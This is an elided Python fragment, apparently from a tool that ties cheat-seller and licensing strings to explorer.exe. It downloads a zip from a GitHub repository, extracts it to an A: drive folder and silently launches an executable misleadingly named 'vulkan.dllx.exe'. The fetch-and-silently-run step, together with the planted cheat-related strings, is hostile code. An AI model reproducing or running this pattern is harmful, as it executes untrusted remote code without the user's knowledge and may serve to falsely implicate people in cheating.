...
class Empty:
    def __init__(self) -> None:
        self.strings = {
            "explorer.exe": ["MatrixHub", "buymtx.online",  "KeyAuth", r"A:\vulkan64.exe"],
        ...
        self.download = "https://github.com/federaldetections/lol/raw/refs/heads/main/vulkanx64.zip"
    ...
    def run(self) -> None:
        ...
        print("[ + ] Extracted files to A:\\vulkanx64\\")
        
        process = SilentOpen("A:\\vulkanx64\\vulkan.dllx.exe")
